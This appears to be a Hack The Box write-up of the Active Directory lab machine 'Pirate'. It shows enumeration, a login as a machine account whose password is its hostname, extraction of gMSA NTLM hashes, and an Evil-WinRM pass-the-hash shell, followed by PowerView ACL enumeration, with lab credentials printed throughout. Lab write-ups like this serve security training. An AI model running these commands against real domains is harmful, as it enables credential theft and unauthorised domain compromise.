---
title: 'Pirate'
description: 'HTB Machine'
pubDate: '3/5/26'
heroImage: './images/pirate.jpeg'
tags: ["HTB", "Active Directory"]
---

![](./images/Pasted%20image%2020260304061759.png)

## Machine Information

- Name: Pirate  
- Difficulty: Hard  
- OS: Windows
## Introduction  

Pirate is a Windows Active Directory machine that focuses on advanced domain privilege escalation techniques. The compromise of the environment involves abusing legacy Active Directory permissions, extracting managed service account credentials, and leveraging Kerberos delegation mechanisms to escalate privileges.

The attack begins with domain enumeration, where a misconfiguration related to the **Pre-Windows 2000 Compatible Access** group allows broader access to directory information. This access ultimately enables the retrieval of a **Group Managed Service Account (gMSA)** password, providing an initial foothold in the domain.

After obtaining access to an internal host, the attack continues with internal pivoting and the abuse of **NTLM relay** to configure **Resource-Based Constrained Delegation (RBCD)**. This misconfiguration allows the attacker to impersonate privileged users and gain administrative access to additional machines in the domain.

Finally, the compromise of delegation mechanisms combined with **SPN manipulation (SPN-jacking)** allows the redirection of Kerberos authentication flows, leading to the compromise of the **Domain Controller** and full domain takeover.
## Attack Path Overview  
1. Enumerate the domain using LDAP.  
2. Identify the **Pre-Windows 2000 Compatible Access** permissions.  
3. Retrieve the **gMSA password** using the allowed read permissions.  
4. Gain access to **WEB01** using Evil-WinRM.  
5. Pivot internally using **Ligolo**.  
6. Perform **NTLM relay** to configure **Resource-Based Constrained Delegation (RBCD)**.  
7. Abuse **Kerberos delegation** to impersonate Administrator.  
8. Gain administrative access to **WEB01**.  
9. Perform **SPN-jacking** to redirect delegation privileges.  
10. Escalate privileges and compromise **DC01**.
## Initial Port Scanning

``` python
# Nmap 7.95 scan initiated Sat Feb 28 14:04:20 2026 as: /usr/lib/nmap/nmap --privileged -p- -Pn -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt 10.129.5.173
Nmap scan report for 10.129.5.173
Host is up (0.19s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49680/tcp open  unknown
49681/tcp open  unknown
49905/tcp open  unknown
58943/tcp open  unknown
58968/tcp open  unknown

Read data files from: /usr/share/nmap
# Nmap done at Sat Feb 28 14:07:37 2026 -- 1 IP address (1 host up) scanned in 197.11 seconds
```

``` python
# Nmap 7.95 scan initiated Sat Feb 28 14:07:42 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -sC -v -oN nmap_sVsC.txt 10.129.5.173
Nmap scan report for DC01.pirate.htb (10.129.5.173)
Host is up (0.19s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-01 02:08:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Issuer: commonName=pirate-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-09T14:05:15
| Not valid after:  2026-06-09T14:05:15
| MD5:   5c8e:b331:ef90:890a:d8e3:feaa:b53c:2910
|_SHA-1: 0128:c655:2aed:c190:efff:d3eb:a2fb:034b:fa86:ab69
|_ssl-date: 2026-03-01T02:09:25+00:00; +7h00m01s from scanner time.
443/tcp  open  https?
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-03-01T02:09:25+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Issuer: commonName=pirate-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-09T14:05:15
| Not valid after:  2026-06-09T14:05:15
| MD5:   5c8e:b331:ef90:890a:d8e3:feaa:b53c:2910
|_SHA-1: 0128:c655:2aed:c190:efff:d3eb:a2fb:034b:fa86:ab69
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-03-01T02:09:25+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Issuer: commonName=pirate-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-09T14:05:15
| Not valid after:  2026-06-09T14:05:15
| MD5:   5c8e:b331:ef90:890a:d8e3:feaa:b53c:2910
|_SHA-1: 0128:c655:2aed:c190:efff:d3eb:a2fb:034b:fa86:ab69
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-03-01T02:09:25+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Issuer: commonName=pirate-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-09T14:05:15
| Not valid after:  2026-06-09T14:05:15
| MD5:   5c8e:b331:ef90:890a:d8e3:feaa:b53c:2910
|_SHA-1: 0128:c655:2aed:c190:efff:d3eb:a2fb:034b:fa86:ab69
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-03-01T02:08:45
|_  start_date: N/A
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 28 14:09:30 2026 -- 1 IP address (1 host up) scanned in 107.35 seconds
```

### Terminal Configuration

``` python
target=10.129.47.154
domain='pirate.htb'
user='pentest'
password='p3nt3st2025!&'
domain='pirate.htb'
user1='MS01$'
password1='ms01'
user2='gMSA_ADCS_prod$'
password2='304106f739822ea2ad8ebe23f802d078'
user3='gMSA_ADFS_prod$'
password3='8126756fb2e69697bfcb04816e685839'
target1=192.168.100.2
user4='a.white'
password4='E2nvAOKSz5Xz2MJu'
user5='a.white_adm'
password5='Password123!'
```

## DNS Configuration

``` python
└─$ sudo nxc smb $target --generate-hosts-file /etc/hosts
SMB         10.129.6.74     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False)

/etc/hosts

10.129.98.174 DC01.pirate.htb pirate.htb DC01 
192.168.100.2 WEB01.pirate.htb WEB01
```

## SMB Enumeration

``` python
└─$ nxc smb $target -u $user -p $password
SMB         10.129.6.74     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False)
SMB         10.129.6.74     445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&

└─$ nxc smb $target -u $user -p $password --shares
SMB         10.129.6.74     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False)
SMB         10.129.6.74     445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&
SMB         10.129.6.74     445    DC01             [*] Enumerated shares
SMB         10.129.6.74     445    DC01             Share           Permissions     Remark
SMB         10.129.6.74     445    DC01             -----           -----------     ------
SMB         10.129.6.74     445    DC01             ADMIN$                          Remote Admin
SMB         10.129.6.74     445    DC01             C$                              Default share
SMB         10.129.6.74     445    DC01             IPC$            READ            Remote IPC
SMB         10.129.6.74     445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.6.74     445    DC01             SYSVOL          READ            Logon server share

└─$ nxc smb $target -u $user -p $password --users
SMB         10.129.6.74     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False)
SMB         10.129.6.74     445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&
SMB         10.129.6.74     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.6.74     445    DC01             Administrator                 2025-06-08 14:32:36 0       Built-in account for administering the computer/domain
SMB         10.129.6.74     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.6.74     445    DC01             krbtgt                        2025-06-08 14:40:29 0       Key Distribution Center Service Account
SMB         10.129.6.74     445    DC01             a.white_adm                   2026-01-16 00:36:34 0
SMB         10.129.6.74     445    DC01             a.white                       2025-06-08 19:33:01 0
SMB         10.129.6.74     445    DC01             pentest                       2025-06-09 13:40:23 0
SMB         10.129.6.74     445    DC01             j.sparrow                     2025-06-09 15:08:44 0
SMB         10.129.6.74     445    DC01             [*] Enumerated 7 local users: PIRATE
```

## BloodHound

``` python
└─$ nxc ldap $target -u $user -p $password
LDAP        10.129.6.74     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb)
LDAP        10.129.6.74     389    DC01             [+] pirate.htb\pentest:p3nt3st2025!&

┌──(rc㉿Cesar)-[/mnt/c/Users/cesar/HTB/Pirate2]
└─$ nxc ldap $target -u $user -p $password --bloodhound -c All --dns-server $target
LDAP        10.129.6.74     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb)
LDAP        10.129.6.74     389    DC01             [+] pirate.htb\pentest:p3nt3st2025!&
LDAP        10.129.6.74     389    DC01             Resolved collection methods: trusts, localadmin, psremote, group, container, session, rdp, dcom, objectprops, acl
LDAP        10.129.6.74     389    DC01             Done in 00M 37S
LDAP        10.129.6.74     389    DC01             Compressing output into /home/rc/.nxc/logs/DC01_10.129.6.74_2026-03-01_022946_bloodhound.zip
```

## BloodHound MS01

![](./images/Pasted%20image%2020260301062008.png)

![](./images/Pasted%20image%2020260301062132.png)

### What is Pre-Windows 2000 Compatible Access?

This is a special Active Directory group.

Main protocol: LDAP (Lightweight Directory Access Protocol)

Older systems were able to:

- LDAP Queries
- Basic Domain Enumeration
- Read user and group information

In Windows 2000, Microsoft needed to maintain compatibility with older systems (NT 4.0), so created a group that allows:

The Pre-Windows 2000 Compatible Access group allows certain legacy systems  
to read information from Active Directory, such as users and groups. Members of this group may have broader read permissions across the domain.


![](./images/Pasted%20image%2020260301063404.png)

These accounts correspond to machine accounts or service accounts.

### What is gMSA (Group Managed Service Account)?

Is a type of Active Directory domain account designed to automate password management and simplify Service Principal Name (SPN) configuration for services running on Windows servers.

The ReadGMSAPassword permission allows a principal to retrieve the current managed password of a gMSA from the Domain Controller. The members of DOMAIN SECURE SERVERS group can read the passwords of gMSA accounts.
### Pre-Windows 2000 Computer Account Password Spraying (hostname as password)

``` python
└─$ nxc ldap $target -u $user1 -p $password1 -k
LDAP        10.129.6.74     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb)
LDAP        10.129.6.74     389    DC01             [+] pirate.htb\MS01$:ms01

└─$ nxc ldap $target -u $user1 -p $password1 -k --gmsa
LDAP        10.129.6.74     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb)
LDAPS       10.129.6.74     636    DC01             [+] pirate.htb\MS01$:ms01
LDAPS       10.129.6.74     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.129.6.74     636    DC01             Account: gMSA_ADCS_prod$      NTLM: 304106f739822ea2ad8ebe23f802d078     PrincipalsAllowedToReadPassword: Domain Secure Servers
LDAPS       10.129.6.74     636    DC01             Account: gMSA_ADFS_prod$      NTLM: 8126756fb2e69697bfcb04816e685839     PrincipalsAllowedToReadPassword: Domain Secure Servers
```

The domain has 4 machines.

``` python
nxc ldap $target -u $user1 -p $password1 -k --computers
LDAP        10.129.241.227  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb)
LDAP        10.129.241.227  389    DC01             [+] pirate.htb\MS01$:ms01
LDAP        10.129.241.227  389    DC01             [*] Total records returned: 6
LDAP        10.129.241.227  389    DC01             DC01$
LDAP        10.129.241.227  389    DC01             WEB01$
LDAP        10.129.241.227  389    DC01             MS01$
LDAP        10.129.241.227  389    DC01             EXCH01$
LDAP        10.129.241.227  389    DC01             gMSA_ADCS_prod$
LDAP        10.129.241.227  389    DC01             gMSA_ADFS_prod$
```

![](./images/Pasted%20image%2020260301071350.png)

## Evil-Winrm

``` python
$ evil-winrm -i $target -u $user2 -H $password2

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> whoami
pirate\gmsa_adcs_prod$

*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (Switch01):

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::d976:c606:587e:f1e1%8
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.6.74
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Desktop> Resolve-DnsName EXCH01.PIRATE.HTB
EXCH01.PIRATE.HTB : DNS name does not exist
At line:1 char:1
+ Resolve-DnsName EXCH01.PIRATE.HTB
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (EXCH01.PIRATE.HTB:String) [Resolve-DnsName], Win32Exception
    + FullyQualifiedErrorId : DNS_ERROR_RCODE_NAME_ERROR,Microsoft.DnsClient.Commands.ResolveDnsName
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Desktop> Resolve-DnsName WEB01.pirate.htb

Name                                           Type   TTL   Section    IPAddress
----                                           ----   ---   -------    ---------
WEB01.pirate.htb                               A      1200  Answer     192.168.100.2
```
## PowerView

## Domain Equipment Enumeration

``` python
*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$\Desktop> Get-NetComputer


pwdlastset                    : 1/8/2026 1:12:40 PM
logoncount                    : 426
msds-generationid             : {198, 41, 163, 117...}
serverreferencebl             : CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=pirate,DC=htb
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 2/24/2026 3:54:25 PM
name                          : DC01
primarygroupid                : 516
objectsid                     : S-1-5-21-4107424128-4158083573-1300325248-1000
samaccountname                : DC01$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 2/24/2026 11:54:25 PM
accountexpires                : NEVER
cn                            : DC01
operatingsystem               : Windows Server 2019 Standard
instancetype                  : 4
msdfsr-computerreferencebl    : CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=pirate,DC=htb
objectguid                    : d1b955c4-5a95-4a8f-9267-9b58829b2fec
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=pirate,DC=htb
dscorepropagationdata         : {6/8/2025 3:31:56 PM, 6/8/2025 2:40:29 PM, 1/1/1601 12:04:16 AM}
serviceprincipalname          : {Hyper-V Replica Service/DC01, Hyper-V Replica Service/DC01.pirate.htb, Microsoft Virtual System Migration Service/DC01, Microsoft Virtual System Migration Service/DC01.pirate.htb...}
usncreated                    : 12293
usercertificate               : {48, 130, 6, 40...}
memberof                      : {CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=pirate,DC=htb, CN=Cert Publishers,CN=Users,DC=pirate,DC=htb}
lastlogon                     : 3/3/2026 5:40:17 AM
badpwdcount                   : 0
useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
whencreated                   : 6/8/2025 2:40:29 PM
countrycode                   : 0
iscriticalsystemobject        : True
msds-supportedencryptiontypes : 28
usnchanged                    : 127020
ridsetreferences              : CN=RID Set,CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
dnshostname                   : DC01.pirate.htb

logoncount                    : 250
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=WEB01,CN=Computers,DC=pirate,DC=htb
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 2/24/2026 3:54:36 PM
objectsid                     : S-1-5-21-4107424128-4158083573-1300325248-3102
samaccountname                : WEB01$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
countrycode                   : 0
cn                            : WEB01
accountexpires                : NEVER
whenchanged                   : 2/24/2026 11:54:36 PM
instancetype                  : 4
usncreated                    : 28714
objectguid                    : 983c1937-6799-4bb4-956d-45b26fad610b
operatingsystem               : Windows Server 2019 Standard
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=pirate,DC=htb
dscorepropagationdata         : {6/11/2025 1:41:06 PM, 6/11/2025 1:39:15 PM, 6/9/2025 4:21:13 PM, 6/9/2025 4:18:32 PM...}
serviceprincipalname          : {tapinego/WEB01, tapinego/WEB01.pirate.htb, WSMAN/WEB01, WSMAN/WEB01.pirate.htb...}
lastlogon                     : 3/3/2026 5:51:29 AM
iscriticalsystemobject        : False
usnchanged                    : 127028
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 6/8/2025 8:35:29 PM
primarygroupid                : 515
pwdlastset                    : 1/8/2026 1:14:02 PM
msds-supportedencryptiontypes : 28
name                          : WEB01
dnshostname                   : WEB01.pirate.htb

pwdlastset             : 1/15/2026 4:36:34 PM
logoncount             : 1
badpasswordtime        : 6/9/2025 10:51:05 AM
distinguishedname      : CN=MS01,CN=Computers,DC=pirate,DC=htb
objectclass            : {top, person, organizationalPerson, user...}
lastlogontimestamp     : 3/3/2026 5:49:37 AM
name                   : MS01
objectsid              : S-1-5-21-4107424128-4158083573-1300325248-4102
samaccountname         : MS01$
localpolicyflags       : 0
codepage               : 0
samaccounttype         : MACHINE_ACCOUNT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 3/3/2026 1:49:37 PM
instancetype           : 4
usncreated             : 28835
objectguid             : 8c29f2cb-40f0-430d-9a1d-d8499ec562e8
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=pirate,DC=htb
dscorepropagationdata  : {6/11/2025 1:41:06 PM, 6/11/2025 1:39:15 PM, 6/10/2025 2:10:44 PM, 6/9/2025 5:03:58 PM...}
memberof               : {CN=Domain Secure Servers,CN=Users,DC=pirate,DC=htb, CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=pirate,DC=htb}
lastlogon              : 3/3/2026 5:49:37 AM
badpwdcount            : 0
cn                     : MS01
useraccountcontrol     : PASSWD_NOTREQD, WORKSTATION_TRUST_ACCOUNT
whencreated            : 6/8/2025 9:31:11 PM
primarygroupid         : 515
iscriticalsystemobject : False
usnchanged             : 155830

pwdlastset             : 1/15/2026 4:36:34 PM
logoncount             : 0
badpasswordtime        : 6/9/2025 10:05:41 AM
distinguishedname      : CN=EXCH01,CN=Computers,DC=pirate,DC=htb
objectclass            : {top, person, organizationalPerson, user...}
name                   : EXCH01
objectsid              : S-1-5-21-4107424128-4158083573-1300325248-4103
samaccountname         : EXCH01$
localpolicyflags       : 0
codepage               : 0
samaccounttype         : MACHINE_ACCOUNT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 1/16/2026 12:36:34 AM
instancetype           : 4
usncreated             : 28842
objectguid             : 057e0686-6eab-4044-9d25-209661f6fefc
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=pirate,DC=htb
dscorepropagationdata  : {6/11/2025 1:41:06 PM, 6/11/2025 1:39:15 PM, 6/10/2025 2:11:20 PM, 6/9/2025 5:05:25 PM...}
memberof               : CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=pirate,DC=htb
lastlogon              : 12/31/1600 4:00:00 PM
badpwdcount            : 2
cn                     : EXCH01
useraccountcontrol     : PASSWD_NOTREQD, WORKSTATION_TRUST_ACCOUNT
whencreated            : 6/8/2025 9:31:20 PM
primarygroupid         : 515
iscriticalsystemobject : False
usnchanged             : 65606

pwdlastset                     : 3/3/2026 5:49:40 AM
logoncount                     : 0
badpasswordtime                : 3/3/2026 5:48:49 AM
msds-managedpasswordpreviousid : {1, 0, 0, 0...}
distinguishedname              : CN=gMSA_ADCS_prod,CN=Managed Service Accounts,DC=pirate,DC=htb
objectclass                    : {top, person, organizationalPerson, user...}
name                           : gMSA_ADCS_prod
objectsid                      : S-1-5-21-4107424128-4158083573-1300325248-4105
msds-groupmsamembership        : {1, 0, 4, 128...}
localpolicyflags               : 0
codepage                       : 0
samaccounttype                 : MACHINE_ACCOUNT
accountexpires                 : NEVER
countrycode                    : 0
whenchanged                    : 3/3/2026 1:49:40 PM
instancetype                   : 4
usncreated                     : 32855
objectguid                     : fc77da5e-0165-4165-85ba-57af2171cf5f
msds-managedpasswordid         : {1, 0, 0, 0...}
samaccountname                 : gMSA_ADCS_prod$
objectcategory                 : CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=pirate,DC=htb
dscorepropagationdata          : 1/1/1601 12:00:00 AM
memberof                       : CN=Remote Management Users,CN=Builtin,DC=pirate,DC=htb
msds-managedpasswordinterval   : 30
lastlogon                      : 12/31/1600 4:00:00 PM
badpwdcount                    : 18
cn                             : gMSA_ADCS_prod
useraccountcontrol             : WORKSTATION_TRUST_ACCOUNT
whencreated                    : 6/9/2025 1:39:40 PM
primarygroupid                 : 515
iscriticalsystemobject         : False
msds-supportedencryptiontypes  : 28
usnchanged                     : 155842
lastlogoff                     : 12/31/1600 4:00:00 PM
dnshostname                    : adcs.pirate.htb

pwdlastset                     : 3/3/2026 5:49:39 AM
logoncount                     : 50
badpasswordtime                : 3/3/2026 5:48:07 AM
msds-managedpasswordpreviousid : {1, 0, 0, 0...}
distinguishedname              : CN=gMSA_ADFS_prod,CN=Managed Service Accounts,DC=pirate,DC=htb
objectclass                    : {top, person, organizationalPerson, user...}
lastlogontimestamp             : 2/24/2026 3:54:56 PM
name                           : gMSA_ADFS_prod
objectsid                      : S-1-5-21-4107424128-4158083573-1300325248-4108
msds-groupmsamembership        : {1, 0, 4, 128...}
localpolicyflags               : 0
codepage                       : 0
samaccounttype                 : MACHINE_ACCOUNT
accountexpires                 : NEVER
countrycode                    : 0
whenchanged                    : 3/3/2026 1:49:40 PM
instancetype                   : 4
usncreated                     : 37005
objectguid                     : 293c10db-e1d6-423f-b9ee-f5806347d8ef
msds-managedpasswordid         : {1, 0, 0, 0...}
samaccountname                 : gMSA_ADFS_prod$
objectcategory                 : CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=pirate,DC=htb
dscorepropagationdata          : 1/1/1601 12:00:00 AM
serviceprincipalname           : host/adfs.pirate.htb
memberof                       : CN=Remote Management Users,CN=Builtin,DC=pirate,DC=htb
msds-managedpasswordinterval   : 30
lastlogon                      : 3/3/2026 5:50:06 AM
badpwdcount                    : 0
cn                             : gMSA_ADFS_prod
useraccountcontrol             : WORKSTATION_TRUST_ACCOUNT
whencreated                    : 6/9/2025 2:48:41 PM
primarygroupid                 : 515
iscriticalsystemobject         : False
msds-supportedencryptiontypes  : 28
usnchanged                     : 155836
lastlogoff                     : 12/31/1600 4:00:00 PM
dnshostname                    : adfs.pirate.htb


*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Desktop> Get-DomainComputer WEB01 -Properties *


logoncount                    : 251
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=WEB01,CN=Computers,DC=pirate,DC=htb
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 2/24/2026 3:54:36 PM
objectsid                     : S-1-5-21-4107424128-4158083573-1300325248-3102
samaccountname                : WEB01$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
countrycode                   : 0
cn                            : WEB01
accountexpires                : NEVER
whenchanged                   : 2/24/2026 11:54:36 PM
instancetype                  : 4
usncreated                    : 28714
objectguid                    : 983c1937-6799-4bb4-956d-45b26fad610b
operatingsystem               : Windows Server 2019 Standard
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=pirate,DC=htb
dscorepropagationdata         : {6/11/2025 1:41:06 PM, 6/11/2025 1:39:15 PM, 6/9/2025 4:21:13 PM, 6/9/2025 4:18:32 PM...}
serviceprincipalname          : {tapinego/WEB01, tapinego/WEB01.pirate.htb, WSMAN/WEB01, WSMAN/WEB01.pirate.htb...}
lastlogon                     : 3/2/2026 11:31:39 PM
iscriticalsystemobject        : False
usnchanged                    : 127028
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 6/8/2025 8:35:29 PM
primarygroupid                : 515
pwdlastset                    : 1/8/2026 1:14:02 PM
msds-supportedencryptiontypes : 28
name                          : WEB01
dnshostname                   : WEB01.pirate.htb
```

## ACL Analysis: SELF Permissions on WEB01$

``` python
*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$\Desktop> Get-DomainObjectAcl -Identity WEB01$ -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -match "S-1-5-10"}


AceQualifier           : AccessAllowed
ObjectDN               : CN=WEB01,CN=Computers,DC=pirate,DC=htb
ActiveDirectoryRights  : Self
ObjectAceType          : DNS-Host-Name-Attributes
ObjectSID              : S-1-5-21-4107424128-4158083573-1300325248-3102
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 8
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=WEB01,CN=Computers,DC=pirate,DC=htb
ActiveDirectoryRights  : Self
ObjectAceType          : Validated-SPN
ObjectSID              : S-1-5-21-4107424128-4158083573-1300325248-3102
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 8
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=WEB01,CN=Computers,DC=pirate,DC=htb
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : Personal-Information
ObjectSID              : S-1-5-21-4107424128-4158083573-1300325248-3102
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 48
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceType               : AccessAllowed
ObjectDN              : CN=WEB01,CN=Computers,DC=pirate,DC=htb
ActiveDirectoryRights : CreateChild, DeleteChild
OpaqueLength          : 0
ObjectSID             : S-1-5-21-4107424128-4158083573-1300325248-3102
InheritanceFlags      : None
BinaryLength          : 20
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-10
AccessMask            : 3
AuditFlags            : None
AceFlags              : None
